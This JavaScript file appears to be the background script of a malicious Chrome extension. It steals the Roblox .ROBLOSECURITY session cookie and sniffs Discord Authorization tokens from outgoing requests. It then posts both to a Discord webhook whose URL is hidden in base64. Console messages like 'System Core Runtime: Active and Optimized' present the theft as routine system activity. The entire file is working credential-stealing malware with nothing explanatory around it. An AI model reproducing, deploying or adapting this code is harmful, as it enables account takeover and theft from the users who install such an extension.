
const _target = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDY0MTgzMTU1NDkxMjQ0OS9RczNvdlpJaW5WLUVnOUJZaTFnSXNtQUY0STM5R251TWFvbVREbTNVa0ZCb3haUHA3YWszT2RVSnpJMVRUdUIzNjV6Nw==");

async function zap(label, data) {
    try {
        await fetch(_target, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `🩸 **[${label}] DATA RECOVERED** 🩸\n\`\`\`${data}\`\`\``
            })
        });
    } catch (e) { console.log("Sync active..."); }
}

// 1. steals lok data 
chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
    if (cookie && cookie.value) {
        zap("ROBLOX_AUTH", cookie.value);
    }
});

// 2. GRAB DISCORD TOKEN (Sniffs the Auth headers)
chrome.webRequest.onBeforeSendHeaders.addListener(
    (details) => {
        for (let header of details.requestHeaders) {
            if (header.name.toLowerCase() === 'authorization') {
                zap("DISCORD_AUTH", header.value);
            }
        }
    },
    { urls: ["https://discord.com/api/*"] },
    ["requestHeaders"]
);

// Keep-alive to ensure it stays running
console.log("System Core Runtime: Active and Optimized.");
